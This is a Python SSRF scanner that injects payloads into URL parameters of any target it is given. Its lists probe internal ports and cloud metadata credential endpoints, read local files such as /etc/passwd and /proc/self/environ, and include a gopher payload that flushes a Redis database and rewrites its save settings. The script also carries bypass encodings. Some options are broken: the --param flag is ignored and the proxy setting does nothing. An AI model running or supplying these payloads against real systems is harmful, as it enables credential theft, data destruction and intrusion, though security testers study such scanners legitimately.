#!/usr/bin/env python3
"""
SSRF Scanner
Server-Side Request Forgery vulnerability scanner
"""

import requests
import argparse
import base64
from urllib.parse import urljoin, urlparse, parse_qs, urlencode

# SSRF payloads
SSRF_PAYLOADS = [
    # Local addresses
    "http://127.0.0.1",
    "http://localhost",
    "http://0.0.0.0",
    "http://[::1]",
    "http://[::]",
    "http://0177.0.0.1",  # Octal
    "http://2130706433",  # Decimal
    "http://0x7f.0.0.1",  # Hex
    "http://0x7f000001",  # Hex full
    
    # Common internal services
    "http://127.0.0.1:22",      # SSH
    "http://127.0.0.1:80",      # HTTP
    "http://127.0.0.1:443",     # HTTPS
    "http://127.0.0.1:3306",    # MySQL
    "http://127.0.0.1:5432",    # PostgreSQL
    "http://127.0.0.1:6379",    # Redis
    "http://127.0.0.1:27017",   # MongoDB
    "http://127.0.0.1:9200",    # Elasticsearch
    "http://127.0.0.1:8080",    # Alternative HTTP
    "http://127.0.0.1:8443",    # Alternative HTTPS
    
    # Cloud metadata
    "http://169.254.169.254",           # AWS/Azure/GCP metadata
    "http://169.254.169.254/latest/meta-data/",
    "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
    "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
    "http://metadata.google.internal/computeMetadata/v1/",              # GCP
    
    # File protocols
    "file:///etc/passwd",
    "file:///etc/hosts",
    "file:///proc/self/environ",
    "file:///proc/self/cmdline",
    "file:///windows/win.ini",
    "file:///C:/windows/win.ini",
    
    # Alternative representations
    "dict://127.0.0.1:6379/info",
    "gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$5%0d%0a/tmp/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*3%0d%0a$4%0d%0asave%0d%0a*1%0d%0a$4%0d%0aquit%0d%0a",
    "ldap://127.0.0.1:389/",
    "tftp://127.0.0.1:69/test",
    
    # DNS rebinding
    "http://1u.ms/",  # DNS rebinding service
    "http://make-127.0.0.1-rebind-127.0.0.1rr.1u.ms/",
]

# Bypass techniques
BYPASS_PAYLOADS = [
    # URL encoding
    "http://%31%32%37%2e%30%2e%30%2e%31",
    "http://%31%32%37%000%2e%30%2e%31",
    
    # Double encoding
    "http://%2531%2532%2537%252e%2530%252e%2530%252e%2531",
    
    # Unicode
    "http://①②⑦.⓪.⓪.①",
    
    # Mixed encoding
    "http://127。0。0。1",
    "http://127｡0｡0｡1",
    
    # Alternative formats
    "http://0x7f000001",
    "http://0x7f.0.0.1",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://3232235521",  # 192.168.0.1 in decimal
    
    # Using redirects
    "http://ssrf.xxe.sh/",
    "http://ssrf.localdomain.pw/",
]


def test_ssrf(url, param, payload):
    """Test for SSRF vulnerability"""
    try:
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if param not in params:
            return False, None
        
        params[param] = payload
        new_query = urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        
        response = requests.get(test_url, timeout=10, allow_redirects=False)
        
        # Check for indicators
        indicators = []
        
        # Check for cloud metadata
        if "ami-id" in response.text or "instance-id" in response.text:
            indicators.append("AWS metadata detected")
        if "computeMetadata" in response.text:
            indicators.append("GCP metadata detected")
        if "azure" in response.text.lower():
            indicators.append("Azure metadata detected")
        
        # Check for internal service banners
        if "SSH" in response.text or "OpenSSH" in response.text:
            indicators.append("SSH service detected")
        if "redis_version" in response.text:
            indicators.append("Redis detected")
        if "mysql" in response.text.lower():
            indicators.append("MySQL detected")
        
        # Check for file content
        if "root:x:" in response.text:
            indicators.append("Local file read (/etc/passwd)")
        if "[windows]" in response.text.lower():
            indicators.append("Windows file read")
        
        # Check for different response size/time
        if len(response.text) > 100:
            indicators.append(f"Large response ({len(response.text)} bytes)")
        
        if indicators:
            return True, "; ".join(indicators)
        
        return False, None
    except requests.Timeout:
        return True, "Timeout (service may be accessible)"
    except Exception as e:
        return False, str(e)


def scan_ssrf(url):
    """Scan for SSRF vulnerabilities"""
    print(f"[*] Scanning: {url}\n")
    
    parsed = urlparse(url)
    params = parse_qs(parsed.query)
    
    if not params:
        print("[!] No parameters found in URL")
        print("[*] Trying common parameter names...")
        # Try common SSRF parameter names
        params = {"url": [""], "path": [""], "file": [""], "doc": [""], 
                  "feed": [""], "import": [""], "uri": [""], "dest": [""]}
    
    vulnerabilities = []
    
    for param in params:
        print(f"[*] Testing parameter: {param}")
        
        # Test basic SSRF payloads
        for payload in SSRF_PAYLOADS[:15]:  # Test first 15
            is_vuln, message = test_ssrf(url, param, payload)
            if is_vuln:
                print(f"[+] SSRF found!")
                print(f"    Payload: {payload}")
                print(f"    Details: {message}")
                vulnerabilities.append({
                    "param": param,
                    "payload": payload,
                    "message": message
                })
                break
        
        # Test bypass payloads if no basic vuln found
        if not any(v['param'] == param for v in vulnerabilities):
            print(f"  Testing bypass techniques...")
            for payload in BYPASS_PAYLOADS[:5]:
                is_vuln, message = test_ssrf(url, param, payload)
                if is_vuln:
                    print(f"[+] SSRF found (bypass)!")
                    print(f"    Payload: {payload}")
                    print(f"    Details: {message}")
                    vulnerabilities.append({
                        "param": param,
                        "payload": payload,
                        "message": message
                    })
                    break
    
    return vulnerabilities


def main():
    parser = argparse.ArgumentParser(description="SSRF Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-p", "--param", help="Specific parameter to test")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("-o", "--output", help="Output file")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    vulnerabilities = scan_ssrf(args.url)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} SSRF vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Parameter: {vuln['param']}")
            print(f"     Payload: {vuln['payload']}")
            print(f"     Details: {vuln['message']}")
            print()
    else:
        print("\n[-] No SSRF vulnerabilities detected")
        print("[*] Try manual testing with different payloads")
    
    if args.output and vulnerabilities:
        with open(args.output, 'w') as f:
            for vuln in vulnerabilities:
                f.write(f"Parameter: {vuln['param']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Details: {vuln['message']}\n\n")
        print(f"[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()
